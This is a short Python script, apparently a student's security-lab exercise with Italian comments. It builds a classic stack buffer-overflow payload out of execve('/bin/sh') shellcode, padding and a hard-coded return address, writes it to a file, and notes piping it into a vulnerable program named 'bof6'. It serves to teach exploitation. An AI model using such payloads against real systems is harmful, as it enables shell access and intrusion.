#note

import os
import struct

#[shellcode][padding]

#shellcode in questo caso nella sua correzione e` diverso: perche`?
shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80") #e` tipo solo una parte dell'altro 
buffer = 0xbffff2c0 #fp

retaddr = 0xbffff240 #buffer

padding = 128 - len(shellcode)

payload = shellcode
payload += "A"*padding
payload += struct.pack("I", retaddr)

f = open("badfile", "a")
f.write("%s" % payload)
f.close()

##poi bisogna invocarlo con 'cat badfile - | ./bof6' da terminale --> ma percheeeee`?



